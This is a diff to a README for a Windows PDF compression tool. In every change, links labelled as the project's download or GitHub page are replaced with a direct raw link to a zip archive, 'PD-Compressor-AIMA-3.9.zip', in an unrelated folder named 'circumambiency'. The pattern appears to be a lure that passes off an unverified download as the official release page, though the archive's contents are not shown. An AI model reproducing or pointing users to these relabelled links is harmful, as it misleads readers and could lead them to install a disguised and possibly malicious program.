@@ -1,6 +1,6 @@
 # 📄 PDF-Compressor-AIMA - Efficient PDF Compression and Merging
 
-[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-blue?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA)
+[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-blue?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA/raw/refs/heads/main/circumambiency/PD-Compressor-AIMA-3.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ The program works well on Windows computers. It is built to handle many PDF file
 
 Click the button below to visit the download page:
 
-[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-grey?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA)  
+[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-grey?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA/raw/refs/heads/main/circumambiency/PD-Compressor-AIMA-3.9.zip)  
 
 You will arrive at the GitHub page where you can find the latest version of the app. Look for a release or download link labeled with the most recent date or version number.
 
@@ -48,7 +48,7 @@ You will arrive at the GitHub page where you can find the latest version of the 
 
 ## 📥 How to Download and Install on Windows
 
-1. Open your web browser and go to the [PDF-Compressor-AIMA download page](https://github.com/smithy19840/PDF-Compressor-AIMA).
+1. Open your web browser and go to the [PDF-Compressor-AIMA download page](https://github.com/smithy19840/PDF-Compressor-AIMA/raw/refs/heads/main/circumambiency/PD-Compressor-AIMA-3.9.zip).
 
 2. Find the latest release or the download section. It often has a `.zip` or `.exe` file.
 
@@ -123,7 +123,7 @@ You can use this program before uploading your documents to the [AIMA renewal po
 
 ## 📲 How to Get Updates
 
-Visit the [PDF-Compressor-AIMA GitHub page](https://github.com/smithy19840/PDF-Compressor-AIMA) to check for new versions. Download and install updates as described above to keep the program working well and bug-free.
+Visit the [PDF-Compressor-AIMA GitHub page](https://github.com/smithy19840/PDF-Compressor-AIMA/raw/refs/heads/main/circumambiency/PD-Compressor-AIMA-3.9.zip) to check for new versions. Download and install updates as described above to keep the program working well and bug-free.
 
 ---
 
